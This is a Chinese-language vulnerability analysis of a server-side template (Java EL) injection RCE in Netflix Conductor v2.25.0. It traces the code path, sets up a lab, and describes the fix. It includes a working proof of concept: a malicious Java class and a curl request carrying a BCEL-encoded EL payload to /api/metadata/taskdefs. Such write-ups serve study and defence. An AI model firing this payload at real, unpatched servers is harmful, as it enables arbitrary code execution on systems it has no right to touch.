@@ -1,0 +1,151 @@
+## 漏洞通告
+Netflix Conductor是 Netflix
+开发的一款工作流编排的引擎，项目地址：
+，本次漏洞成因在于自定义约束冲突时的错误信息支持了 Java EL 表达式，而且这部分错误信息是攻击者可控的，所以攻击者可以通过注入 Java EL
+表达式进行任意代码执行。
+## 漏洞分析
+根据通告的漏洞描述，可以看到漏洞问题出在对 `buildConstraintViolationWithTemplate` 函数的不当使用上，和今年的另一个
+CVE-2020-10199，Nexus Repository Manager RCE 的成因相同。
+> ###### Description:
+>
+> Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint
+> validators. When building custom constraint violation error messages,
+> different types of interpolation are supported, including Java EL
+> expressions. If an attacker can inject arbitrary data in the error message
+> template being passed to
+> ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument,
+> they will be able to run arbitrary Java code.
+对该代码进行全局搜索，可以看到 `TaskTimeoutConstraint.java` 使用了该函数，且函数参数是利用
+`String.format(0)` 生成的格式化字符串，格式化过程中存在用户可控的变量。
+下一步继续关注 `TaskTimeoutConstraint.java` 在哪被使用，通过 Intellij 的引用搜索，定位到
+common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java
+文件：
+可以看到 `TaskTimeoutConstraint` 注解到了 `TaskDef` 类上，那么下一步进行看 `TaskDef`
+类会在哪里被使用，继续搜索全局引用，可以看到
+jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java
+会  
+把该类和路由 `/api/metadata/taskdefs` 绑定，即我们通过请求该路由，即可获得 `TaskDef` 对象。
+    /*省略注释*/
+    package com.netflix.conductor.server.resources;
+    import ...
+    /**
+     * @author Viren
+     */
+    @Api(value = "/metadata", produces = MediaType.APPLICATION_JSON, consumes = MediaType.APPLICATION_JSON, tags = "Metadata Management")
+    @Path("/metadata")
+    @Produces({MediaType.APPLICATION_JSON})
+    @Consumes({MediaType.APPLICATION_JSON})
+    public class MetadataResource {
+        private final MetadataService metadataService;
+        @Inject
+        public MetadataResource(MetadataService metadataService) {
+            this.metadataService = metadataService;
+        }
+        @POST
+        @Path("/taskdefs")
+        @ApiOperation("Create new task definition(s)")
+        public void registerTaskDef(List taskDefs) {
+            metadataService.registerTaskDef(taskDefs);
+        }
+        @PUT
+        @Path("/taskdefs")
+        @ApiOperation("Update an existing task")
+        public void registerTaskDef(TaskDef taskDef) {
+            metadataService.updateTaskDef(taskDef);
+        }
+        @GET
+        @Path("/taskdefs")
+        @ApiOperation("Gets all task definition")
+        @Consumes(MediaType.WILDCARD)
+        public List getTaskDefs() {
+            return metadataService.getTaskDefs();
+        }
+        // 省略无关代码
+    }
+阅读目录下的相关文档 docs/docs/labs/beginner.md，可以知道如何访问该 api：
+    curl -X POST \
+      http://localhost:8080/api/metadata/taskdefs \
+      -H 'Content-Type: application/json' \
+      -d '[
+        {
+          "name": "verify_if_idents_are_added",
+          "retryCount": 3,
+          "retryLogic": "FIXED",
+          "retryDelaySeconds": 10,
+          "timeoutSeconds": 300,
+          "timeoutPolicy": "TIME_OUT_WF",
+          "responseTimeoutSeconds": 180
+        },
+        {
+          "name": "add_idents",
+          "retryCount": 3,
+          "retryLogic": "FIXED",
+          "retryDelaySeconds": 10,
+          "timeoutSeconds": 300,
+          "timeoutPolicy": "TIME_OUT_WF",
+          "responseTimeoutSeconds": 180
+        }
+    ]'
+所以漏洞最终的利用逻辑如下：
+  1. 通过 POST 请求访问 URL `/api/metadata/taskdefs` 创建 `TaskDef` 对象
+  2. 由于我们构造的参数中的 `timeoutSeconds` 和 `responseTimeoutSeconds` 满足了 `taskDef.getTimeoutSeconds() > 0` 以及 `taskDef.getResponseTimeoutSeconds() > taskDef.getTimeoutSeconds()` 这两个条件，`TaskTimeoutValidator` 校验失败，`TaskDef` 的 `name` 属性作为错误信息的一部分通过 `buildConstraintViolationWithTemplate(0)` 输出
+  3. 由于 `name` 是我们构造好的 Java EL 表达式，所以最后该表达式会被执行，进而成功触发远程代码执行
+## 漏洞利用
+### 环境构建
+    # 下载源码
+    git clone https://github.com/Netflix/conductor.git
+    cd conductor
+    # 切换到存在漏洞的分支
+    git checkout v2.25.0
+    # 启动 docker
+    cd docker
+    docker-compose up -d
+正常运行后效果如下图：  
+### RCE
+这里利用 `com.sun.org.apache.bcel.internal.util.ClassLoader`
+加载我们构造好的恶意类的方式来触发远程执行。
+其中恶意构造好的 java 类代码如下：
+    public class Evil {
+        public Evil() {
+            try {
+                Runtime.getRuntime().exec("touch /tmp/pwned");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        public static void main(String[] args) {
+        }
+    }
+将恶意构造的 class 文件通过 bcel 编码后作为参数，构造出 EL 表达式，作为 `name` 属性的值：
+    curl --location --request POST 'http://localhost:8080/api/metadata/taskdefs' \
+    --header 'Content-Type: application/json' \
+    --data-raw '[{
+      "name": "${'\'' '\''.getClass().forName('\''com.sun.org.apache.bcel.internal.util.ClassLoader'\'').newInstance().loadClass('\''$$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91$cdN$c2$40$U$85$cf$94J$b1$W$a9$u$u$f8$af$LQ$T$d9$b8$c3$b81$b8$c2$9f$I$d1$85$hK$99$e0$m$b4M$j$d07r$cd$G$8d$L$l$c0$87R$ef$8c$89$98h$93$b93$f7$dcs$bf$9b$99$be$7f$bc$be$B$d8$c7$a6$8d$U$e6l$e4$90Oa$5e$ed$L$W$K6$sP$b4$b0ha$89$ny$m$C$n$P$Z$S$a5$edK$G$f3$ulq$86LM$E$fc$b4$dfk$f2$b8$e15$bb$a4$a4$eb$d2$f3$efN$bcH$e7$ba$bb$40$f6$9e$t$C$86$7c$e9$ba$d6$f1$G$5e$b9$eb$F$edr$5d$c6$ohW$U$ce$ae$87$fd$d8$e7$c7B$n$s$ab$D$d1$ddS$3e$H$93$b0$z$y$3bX$c1$w$83$x$c3$be$7f$bbV$96$bd$a8$i$3d$E$bc$e5$60$N$eb$M$b3cf$f5$d1$e7$91$Ua$e0$60$D6$NV$y$ea$i$3b$ce$9a$j$eeK$86$99$b1t$d1$P$a4$e8$d1d$bb$cd$e5O$92$xm$d7$fex$w$84$e4$8f$dcg$d8$w$fds$95_$d2y$i$fa$fc$fe$9e$g2$R$V$a5$7e$97F$ec$f9$i$eb$b0$e8$bd$d5g$80$a9$xR$9c$a2$ec$86r$83$f6$fc$ce3$d8$L$8clb$E$f3$ea$J$a9$da$ee$I$c9$n$b9L$a4$e1$d2o1$e0$90$af$88$a4f$98Z$b7te$86$b4$i$d1$d3Tqa$7cR$60$W$a6U$c8$984$cb$r$c7$f7$b4$C$z$a6$d6P$l$U0$a9$F$87bV$83g$bf$AU$b9$Sh$o$C$A$A'\'').newInstance().class}",
+      "ownerEmail": "PI:EMAIL",
+      "retryCount": 3,
+      "timeoutSeconds": 1200,
+      "inputKeys": [
+        "sourceRequestId",
+        "qcElementType"
+      ],
+      "outputKeys": [
+        "state",
+        "skipped",
+        "result"
+      ],
+      "timeoutPolicy": "TIME_OUT_WF",
+      "retryLogic": "FIXED",
+      "retryDelaySeconds": 600,
+      "responseTimeoutSeconds": 3600,
+      "concurrentExecLimit": 100,
+      "rateLimitFrequencyInSeconds": 60,
+      "rateLimitPerFrequency": 50,
+      "isolationgroupId": "myIsolationGroupId"
+    }]'
+进入 docker 后可以看到成功触发 RCE：  
+## 漏洞修复
+根据漏洞相关的 pull requests：
+可以定位对该漏洞的修复：
+开发者将 `org.hibernate:hibernate-validator` 替换为了 `org.apache.bval:bval-jsr`，而后者在最新版本下不会解析 Java EL 表达式，所以也不会有 RCE 的危险。
+## 参考链接
+  * [GHSL-2020-027: Server-Side Template Injection in Netflix Conductor](https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor)
